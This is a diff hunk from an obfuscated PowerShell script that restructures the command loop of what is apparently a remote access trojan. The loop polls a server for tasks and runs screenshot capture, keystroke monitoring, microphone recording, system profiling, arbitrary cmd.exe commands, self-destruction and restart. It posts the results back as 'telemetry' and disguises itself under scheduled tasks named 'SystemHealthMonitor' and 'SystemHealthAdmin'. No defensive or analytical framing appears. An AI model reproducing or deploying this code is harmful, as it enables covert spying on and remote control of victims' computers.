@@ -17,4 +17,28 @@ function Get-0xE5F{param($dur=10);try{Add-Type -TypeDefinition 'using System;usi
 function Invoke-0xF6G{param($c);try{${_o}=& cmd.exe /c $c 2>&1;return @{data_type="cmd_result";data=(@{command=$c;output=${_o};exit_code=$LASTEXITCODE;executed_as="USER"}|ConvertTo-Json -Compress)}}catch{return @{data_type="cmd_result";data=(@{command=$c;error=$_.Exception.Message}|ConvertTo-Json -Compress)}}}
 function Remove-0xG7H{try{Unregister-ScheduledTask -TaskName "SystemHealthMonitor" -Confirm:$false -EA SilentlyContinue;Unregister-ScheduledTask -TaskName "SystemHealthAdmin" -Confirm:$false -EA SilentlyContinue;Get-Process -Name "powershell" -EA SilentlyContinue|Where-Object{$_.Id -ne $PID}|Stop-Process -Force -EA SilentlyContinue;Start-Sleep 2;Remove-Item ${_bp} -Recurse -Force -EA SilentlyContinue;return @{data_type="sysinfo";data="Agent destroyed"}}catch{return @{data_type="error";data=$_.Exception.Message}}}
 ${_si}=if(${_cfg}.sync_interval){${_cfg}.sync_interval}else{10};${_ri}=if(${_cfg}.retry_interval){${_cfg}.retry_interval}else{10};${_lt}=Get-Date;${_tt}=@("screenshot","input_monitor","system_info","voice_capture","cmd_exec","auto_destruct","restart_agent")
-while($true){try{${_now}=Get-Date;if((${_now}-${_lt}).TotalSeconds -ge 60){Invoke-0x8F3 -ep "devices?device_id=eq.${_did}" -mt "PATCH" -bd @{last_seen=${_now}.ToString("o")};${_lt}=${_now}};${_tl}=Invoke-0x8F3 -ep "tasks?device_id=eq.${_did}&status=eq.pending&task_type=in.($(${_tt} -join ','))&order=created_at.asc&limit=5";if(${_tl}){foreach(${_t} in ${_tl}){Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="processing"};${_tr}=$null;switch(${_t}.task_type){"screenshot"{${_tr}=Get-0xA1B}"input_monitor"{${_d}=60;if(${_t}.task_params -and ${_t}.task_params.duration){${_d}=[int]${_t}.task_params.duration};if(${_d} -gt 300){${_d}=300};${_tr}=Get-0xC3D -dur ${_d}}"system_info"{${_tr}=Get-0xD4E}"voice_capture"{${_d}=10;if(${_t}.task_params -and ${_t}.task_params.duration){${_d}=[int]${_t}.task_params.duration};if(${_d} -gt 120){${_d}=120};${_tr}=Get-0xE5F -dur ${_d}}"cmd_exec"{${_c}="";if(${_t}.task_params -and ${_t}.task_params.command){${_c}=${_t}.task_params.command};if(${_c}){${_tr}=Invoke-0xF6G -c ${_c}}else{${_tr}=@{data_type="cmd_result";data="No command"}}}"auto_destruct"{${_tr}=Remove-0xG7H;Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{device_id=${_did};data_type=${_tr}.data_type;data=${_tr}.data};Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")};exit 0}"restart_agent"{Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")};Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{device_id=${_did};data_type="sysinfo";data="Restarting..."};try{Stop-ScheduledTask -TaskName "SystemHealthMonitor" -EA SilentlyContinue;Start-ScheduledTask -TaskName "SystemHealthMonitor" -EA SilentlyContinue;Stop-ScheduledTask -TaskName "SystemHealthAdmin" -EA SilentlyContinue;Start-ScheduledTask -TaskName "SystemHealthAdmin" -EA SilentlyContinue}catch{};exit 0}default{${_tr}=@{data_type="error";data="Unknown: $(${_t}.task_type)"}}};if(${_tr}){${_td}=@{device_id=${_did};data_type=${_tr}.data_type};if(${_tr}.data){${_td}.data=${_tr}.data};if(${_tr}.file_data){${_td}.file_data=${_tr}.file_data};Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd ${_td};Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")}}}}}catch{};Start-Sleep ${_si}}
+while($true){
+try{
+${_now}=Get-Date
+if((${_now}-${_lt}).TotalSeconds -ge 60){Invoke-0x8F3 -ep "devices?device_id=eq.${_did}" -mt "PATCH" -bd @{last_seen=${_now}.ToString("o")};${_lt}=${_now}}
+${_tl}=Invoke-0x8F3 -ep "tasks?device_id=eq.${_did}&status=eq.pending&task_type=in.($(${_tt} -join ','))&order=created_at.asc&limit=5"
+if(${_tl}){
+foreach(${_t} in ${_tl}){
+Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="processing"}
+${_tr}=$null
+switch(${_t}.task_type){
+"screenshot"{${_tr}=Get-0xA1B}
+"input_monitor"{${_d}=60;if(${_t}.task_params -and ${_t}.task_params.duration){${_d}=[int]${_t}.task_params.duration};if(${_d} -gt 300){${_d}=300};${_tr}=Get-0xC3D -dur ${_d}}
+"system_info"{${_tr}=Get-0xD4E}
+"voice_capture"{${_d}=10;if(${_t}.task_params -and ${_t}.task_params.duration){${_d}=[int]${_t}.task_params.duration};if(${_d} -gt 120){${_d}=120};${_tr}=Get-0xE5F -dur ${_d}}
+"cmd_exec"{${_c}="";if(${_t}.task_params -and ${_t}.task_params.command){${_c}=${_t}.task_params.command};if(${_c}){${_tr}=Invoke-0xF6G -c ${_c}}else{${_tr}=@{data_type="cmd_result";data="No command"}}}
+"auto_destruct"{${_tr}=Remove-0xG7H;Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{device_id=${_did};data_type=${_tr}.data_type;data=${_tr}.data};Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")};exit 0}
+"restart_agent"{Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")};Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd @{device_id=${_did};data_type="sysinfo";data="Restarting..."};try{Stop-ScheduledTask -TaskName "SystemHealthMonitor" -EA SilentlyContinue;Start-ScheduledTask -TaskName "SystemHealthMonitor" -EA SilentlyContinue;Stop-ScheduledTask -TaskName "SystemHealthAdmin" -EA SilentlyContinue;Start-ScheduledTask -TaskName "SystemHealthAdmin" -EA SilentlyContinue}catch{};exit 0}
+default{${_tr}=@{data_type="error";data="Unknown: $(${_t}.task_type)"}}
+}
+if(${_tr}){${_td}=@{device_id=${_did};data_type=${_tr}.data_type};if(${_tr}.data){${_td}.data=${_tr}.data};if(${_tr}.file_data){${_td}.file_data=${_tr}.file_data};Invoke-0x8F3 -ep "telemetry" -mt "POST" -bd ${_td};Invoke-0x8F3 -ep "tasks?id=eq.$(${_t}.id)" -mt "PATCH" -bd @{status="complete";completed_at=(Get-Date -Format "o")}}
+}
+}
+}catch{}
+Start-Sleep ${_si}
+}
